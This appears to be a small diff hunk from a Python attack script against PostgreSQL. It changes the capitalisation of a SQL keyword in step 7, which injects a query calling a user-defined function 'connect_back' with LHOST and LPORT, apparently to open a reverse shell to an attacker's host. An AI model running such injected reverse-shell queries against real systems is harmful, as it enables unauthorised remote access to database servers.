@@ -100,7 +100,7 @@ def main():
 	
 	# Step 7: Inject query that executes newly created UDF
 	print("Inject query that executes newly created UDF")
-	command = f'select connect_back($${LHOST}$$, {LPORT})'
+	command = f'SELECT connect_back($${LHOST}$$, {LPORT})'
 
 	send_psql_command(ip=ip, command=command)
 if __name__ == '__main__':
